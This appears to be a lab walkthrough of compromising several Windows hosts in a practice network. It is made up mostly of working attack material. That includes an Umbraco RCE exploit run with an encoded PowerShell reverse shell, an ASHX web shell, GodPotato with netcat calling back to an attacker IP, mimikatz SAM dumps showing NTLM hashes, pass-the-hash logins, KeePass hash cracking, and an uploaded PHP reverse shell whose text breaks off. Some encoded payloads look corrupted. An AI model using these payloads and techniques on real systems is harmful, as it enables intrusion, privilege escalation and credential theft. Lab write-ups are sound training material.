nmap -sC -sV 192.168.151.247 -p- -Pn
```

Output:

```txt
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-title: RELIA - New Hire Information
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: RELIA - New Hire Information
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2025-11-12T21:05:57
|_Not valid after:  2026-05-14T21:05:57
|_ssl-date: 2025-12-29T19:54:25+00:00; +28m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-29T19:54:18+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
14020/tcp open  ftp           FileZilla ftpd
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-29T19:54:21
|_  start_date: N/A
|_clock-skew: mean: 27m59s, deviation: 0s, median: 27m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.90 seconds

```

Connect anonymously to ftp and retrieve the file umbraco.pdf

```
ftp 192.168.151.247 -p 14020
get umbraco.pdf
```

Open it and get the passwd:

```
 For Umbraco 7 the requirements are
o IIS 7 or higher
Database, one of the following: SQL CE, SQL Server 2008 or higher or MySQL with support
for case insensitive queries)
•
ASP.NET 4.5 or 4.5.1. Full-Trust•
• Ability to set file/folder permissions for the user that "owns" the Application Pool
• You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
o Please DO NOT share this password with anyone outside the dev team.
• IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.
```

So adding web02.relia.com to /etc/host:

```
echo "192.168.151.247  web02.relia.com" | sudo tee -a /etc/hosts
```

And browse to http://web02.relia.com:14080/umbraco#/content. Access the site with: 

```bash
mark@relia.com:OathDeeplyReprieve91
```

```
searchsploit umbraco
searchsploit -m 49488  
```

Modify the exploit like this:

```

```


```
nc -lnvp 1234
```

```
python3 49488.py -u mark@relia.com -p 'OathDeeplyReprieve91' -i http://web02.relia.com:14080 -c cmd.exe -a '/c powershell -e JABYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA0ACIALAAxwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ABhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgADwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' 
```


```bash
.\GodPotato.exe -cmd ".\nc.exe 192.168.45.152 5555 -e cmd.exe"
```

Output:

```
curl http://192.168.45.152/mimikatz.exe -o c:\temp\mimikatz.exe 
```


```
mimikatz # lsadump::sam
Domain : WEB02
SysKey : 1ae09810bee890e664324bbf41b72690
Local SID : S-1-5-21-3346989224-1161691809-883305090

SAMKey : 542401620d79106c508ebfe0e0aa8463

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 2f2b8d5d4d756a2c72c554580f970c14

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 96eb37c71b09d3be36715512e2b563b4

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-0ASIO86EFNNAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 773838d3ad7932e64f84525ef911d3be5fbf1d8bb49bb0b854ae00c791c02f85
      aes128_hmac       (4096) : f22c5d82eae2e8d4db754a862f7c1fb6
      des_cbc_md5       (4096) : c831b5f7c7f45dc8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-0ASIO86EFNNAdministrator
    Credentials
      des_cbc_md5       : c831b5f7c7f45dc8


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 6b56c4dd97bf93d31da472c568717b7d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0054d63c21a8f7d715eea2a0679264b1

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d1fc72a7a25fb3d1692d107aa92c5c09f9f99a94ce6349df0b5d0d2c5fa66c4c
      aes128_hmac       (4096) : 9efd82cb3f9b413ddf0ab43322c5fcfb
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5


RID  : 000003e8 (1000)
User : mark
  Hash NTLM: dcbbff66580202a5cbede9c010281ce9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : fda415927de3addccc35fb9fd7b9f268

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-0ASIO86EFNNmark
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 174f8c3e74e9d65c06a241ecb7cbec27bb80709dbe3a68544dbd06624170dc61
      aes128_hmac       (4096) : 2c6c36ef561718d627656c403dc06cf7
      des_cbc_md5       (4096) : d0a726b53ea2ba6d

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-0ASIO86EFNNmark
    Credentials
      des_cbc_md5       : d0a726b53ea2ba6d


RID  : 000003e9 (1001)
User : zachary
  Hash NTLM: 54abdf854d8c0653b1be3458454e4a3b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ece78a609e8c2dd1f2a5d81e62385ff6

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-0ASIO86EFNNzachary
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 366fd7a1d9d9df5ce21cee393dcec2588d1ea47d45f9ab26c41d9c1044fca42a
      aes128_hmac       (4096) : 42976a09bbbae01aae45944912c99635
      des_cbc_md5       (4096) : adc258580425648f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-0ASIO86EFNNzachary
    Credentials
      des_cbc_md5       : adc258580425648f


```

```
evil-winrm -i 192.168.151.247 -u 'Administrator' -H '2f2b8d5d4d756a2c72c554580f970c14'
```

## [ COMPROMISED  2 ] vm13 - 192.168.151.248

Command:

```bash
nmap -sC -sV 192.168.209.248
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:24 EST
Nmap scan report for 192.168.151.248
Host is up (0.035s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-21T17:50:24+00:00; +26m01s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-21T17:50:16+00:00
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2025-11-12T21:09:22
|_Not valid after:  2026-05-14T21:09:22
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 26m00s, deviation: 0s, median: 26m00s
| smb2-time: 
|   date: 2025-12-21T17:50:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.17 seconds
```

Comes from general enumeration in WINPREP:

```bash
crackmapexec smb $vm13 -u offsec -p 'lab'  --shares  
```

Output:

```text
SMB         192.168.151.248 445    EXTERNAL         [+] Enumerated shares
SMB         192.168.151.248 445    EXTERNAL         Share           Permissions     Remark
SMB         192.168.151.248 445    EXTERNAL         -----           -----------     ------
SMB         192.168.151.248 445    EXTERNAL         ADMIN$                          Remote Admin
SMB         192.168.151.248 445    EXTERNAL         C$                              Default share
SMB         192.168.151.248 445    EXTERNAL         IPC$            READ            Remote IPC
SMB         192.168.151.248 445    EXTERNAL         transfer        READ,WRITE      
SMB         192.168.151.248 445    EXTERNAL         Users           READ            
```

xfreerdp3 /v:$vm13  /u:offsec /p:lab /cert:ignore  

```bash
smbclient  \\\\$vm13\\transfer -U offsec
```

Some credentials are found:

```text
# At /r14_2022/build/DNN/wwwroot/Config/Backup_202210130421
<add name="SiteSqlServer" connectionString="Data Source=.\SQLExpress;Initial Catalog=dnndatabase;User ID=dnnuser;Password=DotNetNukeDatabasePassword!" providerName="System.Data.SqlClient" />

```

dnnuser:DotNetNukeDatabasePassword!

But more interestingly is that we have  write permissions everywhere. So we uploaded [this shell](https://amandaguglieri.github.io/hackinglife/reverse-shells/#net-asp) to this location 

Location:

```
smbclient  \\\\$vm13\\transfer -U offsec
cd r14_2022\build\DNN\wwwroot\
put shell.ashx
```

Shell:

```
<% @ webhandler language="C#" class="AverageHandler" %> using System; using System.Web; using System.Diagnostics; using System.IO; public class AverageHandler : IHttpHandler { /* .Net requires this to be implemented */ public bool IsReusable { get { return true; } } /* main executing code */ public void ProcessRequest(HttpContext ctx) { Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" + HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl); string command = HttpUtility.ParseQueryString(url.Query).Get("cmd"); ctx.Response.Write("<form method='GET'>Command: <input name='cmd' value='"+command+"'><input type='submit' value='Run'></form>"); ctx.Response.Write("<hr>"); ctx.Response.Write("<pre>"); /* command execution and output retrieval */ ProcessStartInfo psi = new ProcessStartInfo(); psi.FileName = "cmd.exe"; psi.Arguments = "/c "+command; psi.RedirectStandardOutput = true; psi.UseShellExecute = false; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; string s = stmrdr.ReadToEnd(); stmrdr.Close(); ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s)); ctx.Response.Write("</pre>"); ctx.Response.Write("<hr>"); ctx.Response.Write("By <a href='http://www.twitter.com/Hypn'>@Hypn</a>, for educational purposes only."); } }
```


Now we can browse to:

```
http://192.168.151.248/shell.ashx?cmd=whoami
```

Set a listener in kali:

```bash
nc -lnvp 4444
```

And execute commands: 

```bash
http://192.168.151.248/shell.ashx?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Now we check out privs:

```
whoami /priv
```

And we have:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We will exploit ' SeImpersonatePrivilege' and GodPotato.

Upload via the smbshare the following files: GodPotato-NET4.exe from [https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases) and nc.exe from my tools.

Set up a netcat listener in kali:

```bash
nc -lnvp 5555
```


Now we move to where the files were uploaded and run:

```bash
cd c:\transfer\r14_2022\build\DNN\wwwroot   
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.152 5555 -e cmd.exe"
.\GodPotato.exe -cmd ".\nc.exe 192.168.45.152 5555 -e cmd.exe"
```

we check:

```
whoami
```

And we are NT SYSTEM

We upload via the smbshare mimikatz and run:

```
.\mimikatz.exe

token::elevate
lsadump::sam
```

And we obtain:

```
Domain : EXTERNAL
SysKey : 9f3eff4494ba1d9e0b0e4aff92aae595
Local SID : S-1-5-21-4009087542-2049691914-1078741817

SAMKey : 5529b4fbeecfa2ef2085b8ba047e4554

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 56e4633688c0fdd57c610faf9d7ab8df

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : bb55c08d1cbd4a5598932e6e80647804

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-PIFPPLOIHAPAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2d8ec1f6e6ec0e52dbe417c54f369ff4be327b4adc51263b5887d967d1bc8f23
      aes128_hmac       (4096) : 2cf55f27c23ab36204701a4324f5406e
      des_cbc_md5       (4096) : 261c8a7a62f82979

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-PIFPPLOIHAPAdministrator
    Credentials
      des_cbc_md5       : 261c8a7a62f82979


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 52a45969feae0bed4b015c310b71eec7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 796c9fbdabca86dd9eb7c131cb51c24e

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 67b11c15812a6fb02de3afd55d1224e5ad9abbee1f8eaa2a84b7d8b44ca94af5
      aes128_hmac       (4096) : 955da9bc09fa98dd8c4a31506c42e519
      des_cbc_md5       (4096) : 73da312c587998ae

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 73da312c587998ae


RID  : 000003e8 (1000)
User : mark
  Hash NTLM: 666949a828be051120b17ccba8aebfbe

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f59d5e66ed6fe172eb32154c31afe1c5

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-PIFPPLOIHAPmark
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5e5b1df20923029b3104919c91bf76925201c86380d7dcfb9665c5f726b6c3e1
      aes128_hmac       (4096) : 038af8a3dd76cba952da9ad6e685db53
      des_cbc_md5       (4096) : 9e76f88ff4ef1ab6

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-PIFPPLOIHAPmark
    Credentials
      des_cbc_md5       : 9e76f88ff4ef1ab6


RID  : 000003e9 (1001)
User : emma
  Hash NTLM: 289953cccf62743ca4d1ed65183bd868

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9949882981973d1e42875861b91752d6

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-PIFPPLOIHAPemma
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7a99120d228014bf8f88f43768490bd008c131a947f4832d7af6ff9e17d4344f
      aes128_hmac       (4096) : af058c305d4e687de5eb982e25bc2c10
      des_cbc_md5       (4096) : b015bc254ca24015

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-PIFPPLOIHAPemma
    Credentials
      des_cbc_md5       : b015bc254ca24015


```


We have users:

```
Administrator:56e4633688c0fdd57c610faf9d7ab8df
emma:289953cccf62743ca4d1ed65183bd868
mark:666949a828be051120b17ccba8aebfbe
```

From our SYSTEM shell we enable the registry for remote access:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

```

And now:

```bash
xfreerdp3 /v:$vm13 /u:Administrator /pth:'56e4633688c0fdd57c610faf9d7ab8df' /cert:ignore
```


Local flag is in Emma's Desktop. 

Proof flag is in Mark's Desktop.


### Exploitation of smb


Connect to the smb share with anonymous access and locate a keepass file at: 

```text
\DB-back (1)\New Folder\Emma\Documents\Database.kdbx 
```

Download it and crack it locally:

```bash
keepass2john Database.kdbx
```

Output:

```
Database:$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133
```

Save as keepass_hash the following:

```text
$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133
```

Crack:

```bash
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```


Output: welcome1

A password retrieved bo:Luigi=Papal1963 
Notes: Backup Operator

## [ COMPROMISED  5 ]  vm14 - 192.168.151.249


Command:

```bash
nmap -sC -sV 192.168.151.249
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:24 EST
Nmap scan report for 192.168.151.249
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-21T17:50:46+00:00; +26m01s from scanner time.
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2025-11-12T21:58:01
|_Not valid after:  2026-05-14T21:58:01
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-21T17:50:38+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.151.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-21T17:50:41
|_  start_date: N/A
|_clock-skew: mean: 26m01s, deviation: 0s, median: 26m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
```

### local.txt

```bash
feroxbuster  --url http://192.168.151.249:8000/cms
```

Browse to http://192.168.151.249:8000/cms/

Note the footer, RiteCMS version v3. Update the /etc/hosts to ritecms.com

Now, browse to http://ritecms.com:8000/cms/

Look for existing vulnerabilities: https://www.exploit-db.com/exploits/50616

Now browse to http://ritecms.com:8000/cms/admin.php and login with admin:admin. We will browse to Admin > FileManager and click on Upload file. Intercept the request with Burpsuite:


Upload the following shell:

```
POST http://ritecms.com:8000/cms/admin.php HTTP/1.1
Host: ritecms.com:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------96439023227315354721360425105
Content-Length: 11162
Referer: http://ritecms.com:8000/cms/admin.php?mode=filemanager&action=upload&directory=media
Origin: http://ritecms.com:8000
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Connection: keep-alive
Cookie: PHPSESSID=e6hi8edm4bs793mgimga2n2ipn

-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="mode"

filemanager
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="file"; filename="lele.pHp"
Content-Type: application/octet-stream

<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
